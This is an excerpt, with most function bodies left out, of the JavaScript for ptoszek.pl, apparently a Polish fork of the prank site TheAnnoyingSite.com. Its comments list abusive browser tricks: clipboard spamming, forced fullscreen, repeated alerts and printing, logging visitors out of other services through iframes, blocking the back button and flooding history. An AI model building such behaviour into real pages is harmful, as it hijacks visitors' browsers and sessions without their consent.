/*
  ...
  Moja wersja (ptoszek.pl): 
  - https://github.com/jaczup/ptoszek.pl
  Oryginalna wersja (theannoyingsite.com): 
  - https://github.com/feross/TheAnnoyingSite.com/

  Kontakt ze mną: https://jaczup.pl
  Oficjalny serwer Discord (prowadzony w języku polskim), zdobądź tag PTOK: https://dc.ptoszek.pl
  ...
  Współtwórcy:
    ...
    @RZZW304 -https://github.com/RZZW304
*/
...
const VIDEOS = [
  ...
  'media/videos/Reklama Media Expert 2023-@RZZW304.mp4', //added by @RZZW304
]
...
const FILE_DOWNLOADS = [
  ...
  'media/images/Bald Headed Eagle catches salomon-@RZZW304.jpeg'//added by @RZZW
]

// ===================== FRAZY DO SYNTEZY MOWY ===================== //
...
const wins = [] // Przechowuje okna potomne
let interactionCount = 0 // Licznik interakcji użytkownika
const veryLongString = repeatStringNumTimes(repeatStringNumTimes('zostałeś zptoszkowany!!1 ',100),1500) // Bardzo długi string do schowka
let numSuperLogoutIframes = 0 // Liczba iframe do superLogout

// Sprawdza czy okno jest potomne
const isChildWindow = (window.opener && isParentSameOrigin()) ||
  window.location.search.indexOf('child=true') !== -1

// Sprawdza czy okno jest nadrzędne
...
function registerProtocolHandlers () {
  ...
  const protocolWhitelist = [
    'bitcoin','geo','im','irc','ircs','magnet','mailto','mms','news','ircs','nntp','sip','sms','smsto','ssh','tel','urn','webcal','wtai','xmpp'
  ]
...
function startTheramin () {
  ...
  const wave = audioContext.createPeriodicWave(
    Array(10).fill(0).map((_v, i) => Math.cos(i)),
    Array(10).fill(0).map((_v, i) => Math.sin(i))
  )
...
// Powiela string określoną ilość razy
...
// Kopiuje bardzo długi tekst do schowka
function copySpamToClipboard () {
  clipboardCopy(veryLongString)
}

// Kopiuje tekst do schowka użytkownika
...
// Pokazuje alert lub drukuje stronę co 30 sekund
...
// Pokazuje alert z dużą ilością ASCII ART
function showAlert () {
...
// Przełącza stronę w tryb pełnoekranowy
...
// Wylogowuje użytkownika z popularnych serwisów
...
// Blokuje przycisk wstecz w przeglądarce
...
// Wypełnia historię przeglądarki dodatkowymi wpisami
...
// Zwraca losowe współrzędne dla nowego okna
...
// Automatyzuje wyszukiwania Google w nowym oknie
